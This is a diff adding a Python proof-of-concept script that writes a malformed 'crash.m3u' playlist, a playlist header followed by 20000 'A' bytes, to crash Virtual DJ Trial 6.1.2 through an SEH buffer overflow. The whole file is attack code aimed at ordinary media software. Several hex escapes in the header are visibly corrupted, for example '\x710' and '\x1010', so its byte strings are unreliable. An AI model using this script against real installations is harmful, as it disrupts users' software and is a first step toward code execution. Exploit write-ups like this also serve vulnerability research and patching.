@@ -1,0 +1,25 @@
+#Virtual DJ Trail 6.1.2 SEH Buffer Overflow Crash POC
+#vulnerble application link http://www.virtualdj.com/download/trial.html
+#tested on XP SP2
+#author abhishek lyall - abhilyall[at]gmail[dot]com
+#web - http://www.aslitsecurity.com/
+#blog - http://www.aslitsecurity.blogspot.com/
+#!/usr/bin/python
+
+filename = "crash.m3u"
+
+
+head = (
+"\x23\x56\x69\x72\x710\x75\x61\x6C\x1010\x10A\x20\x50\x6C\x61\x79\x6C"   
+"\x69\x73\x710\x0D\x0A\x23\x10D\x69\x78\x510\x79\x70\x65\x3D\x53\x6D"
+"\x61\x72\x710\x0D\x0A\x109\x3A\x5C"
+)
+
+
+junk = "\x41" * 20000
+
+
+
+textfile = open(filename , 'w')
+textfile.write(head+junk)
+textfile.close()
